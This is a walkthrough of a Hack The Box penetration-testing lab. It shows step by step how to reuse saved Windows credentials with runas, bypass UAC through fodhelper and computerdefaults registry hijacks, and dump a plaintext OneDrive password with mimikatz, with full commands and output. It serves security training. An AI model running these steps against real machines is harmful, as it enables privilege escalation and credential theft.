### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Attacking Windows Credential Manager <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.16.166

---

### Question 1:
What is the password mcharles uses for OneDrive?

Let's RDP into the sadams account with the appropriate creds:
```diff
+ $ xfreerdp /v:10.129.16.166 /u:sadams /p:totally2brow2harmon@
```

Run a cmdkey to list stored creds in the cred manager:
```diff
+ C:\Users\sadams>cmdkey /list
```

	Currently stored credentials:
	
	    Target: Domain:interactive=SRV01\mcharles
	    Type: Domain Password
	    User: SRV01\mcharles

Now lets try to impersonate mcharles with the saved creds to pop a shell under their account:
```diff
+ C:\Users\sadams>runas /user:SRV01\mcharles /savecred cmd
```

	Attempting to start cmd as user "SRV01\mcharles" ...

This spawns a new shell as mcharles. We can verify and then use cmdkey again to list the new creds stored:
```diff
+ C:\Windows\system32>whoami
```

	srv01\mcharles
```diff
+ C:\Windows\system32>cmdkey /list
```

	Currently stored credentials:
	
	    Target: WindowsLive:target=virtualapp/didlogical
	    Type: Generic
	    User: 02jejfxhvabjneqt
	    Local machine persistence
	
	    Target: LegacyGeneric:target=onedrive.live.com
	    Type: Generic
	    User: mcharles@inlanefreight.local

I tried using `rundll32 keymgr.dll,KRShowKeyMgr` and backing up the keys to multiple users desktops, and although I didn't receive any error messages the .crs did not show up. I'm assuming because admin privs are needed to complete this action. The question hint mentions bypassing UAC, and after searching 'msconfig UAC bypass' we have a couple commands that will help us do this:
```diff
+ C:\Windows\system32>reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

	The operation completed successfully.
```diff
+ C:\Windows\system32>reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

	The operation completed successfully.
	The operation completed successfully.

Although the terminal still shows us as the mcharles user, we now have access to the Admin user dir.
```diff
+ C:\Windows\system32>cd C:\Users\Administrator
+ C:\Users\Administrator>dir
```

	 Volume in drive C has no label.
	 Volume Serial Number is 03BC-D3A9
	
	 Directory of C:\Users\Administrator
	
	04/27/2025  02:51 AM    <DIR>          .
	04/27/2025  02:51 AM    <DIR>          ..
	04/27/2025  02:51 AM                13 .bash_history
	04/27/2025  02:33 AM    <DIR>          3D Objects
	04/27/2025  02:33 AM    <DIR>          Contacts
	04/27/2025  07:57 AM    <DIR>          Desktop
	04/27/2025  02:33 AM    <DIR>          Documents
	04/27/2025  02:49 AM    <DIR>          Downloads
	04/27/2025  02:33 AM    <DIR>          Favorites
	04/27/2025  02:33 AM    <DIR>          Links
	04/27/2025  02:33 AM    <DIR>          Music
	04/27/2025  02:33 AM    <DIR>          Pictures
	04/27/2025  02:33 AM    <DIR>          Saved Games
	04/27/2025  02:33 AM    <DIR>          Searches
	04/27/2025  02:33 AM    <DIR>          Videos
	               1 File(s)             13 bytes
	              14 Dir(s)   4,555,104,256 bytes free

Now on our attackbox, lets clone mimikatz. You can either build an exe or just download the binary prebuilt from gentilkiwi's GH. Make sure you share everything in the x64 folder, which I have named bin in this example:
```diff
+ $ git clone https://github.com/gentilkiwi/mimikatz
```

	Cloning into 'mimikatz'...
	remote: Enumerating objects: 5039, done.
	remote: Counting objects: 100% (82/82), done.
	remote: Compressing objects: 100% (53/53), done.
	remote: Total 5039 (delta 50), reused 29 (delta 29), pack-reused 4957 (from 3)
	Receiving objects: 100% (5039/5039), 6.04 MiB | 42.97 MiB/s, done.
	Resolving deltas: 100% (3851/3851), done.

Now I'll start a new RDP session to the win client, this time specifying a shared drive:
```diff
+ $ xfreerdp /v:10.129.16.166 /u:sadams /p:totally2brow2harmon@ /drive:share,/home/htb-ac-830862/mimikatz
```

When windows authenticates, go to explorer, click on network>thinclient, and your shared folder with mimikatz should be there. Manually move the bin folder we created from the network share to sadams' home folder.

Now from the Administrator CMD shell we popped, move the folder from sadams to admin home:
```diff
+ C:\Users\Administrator>copy C:\Users\sadams\bin C:\Users\Administrator
```

	C:\Users\sadams\bin\mimidrv.sys
	C:\Users\sadams\bin\mimikatz.exe
	C:\Users\sadams\bin\mimilib.dll
	C:\Users\sadams\bin\mimispool.dll
	        4 file(s) copied.

Now execute it:
```diff
+ C:\Users\Administrator>mimikatz.exe
```

	  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
	
	mimikatz #

The sekurlsa command seemed to encounter a memory issue, so after reading the docs a bit more, we tried vault::cred, which worked beautifully:
```diff
+ mimikatz # sekurlsa::credman
```

	ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```diff
+ mimikatz # vault::cred
```

	TargetName : onedrive.live.com / <NULL>
	UserName   : mcharles@inlanefreight.local
	Comment    : <NULL>
	Type       : 1 - generic
	Persist    : 3 - enterprise
	Flags      : 00000000
	Credential : Inlanefreight#2025
	Attributes : 0
	
	TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
	UserName   : 02jejfxhvabjneqt
	Comment    : PersistedCredential
	Type       : 1 - generic
	Persist    : 2 - local_machine
	Flags      : 00000000
	Credential :
	Attributes : 32
	
	TargetName : LegacyGeneric:target=onedrive.live.com / <NULL>
	UserName   : mcharles@inlanefreight.local
	Comment    : <NULL>
	Type       : 1 - generic
	Persist    : 3 - enterprise
	Flags      : 00000000
	Credential : Inlanefreight#2025
	Attributes : 0

🚩 found **Inlane--edit--freight#2025**.
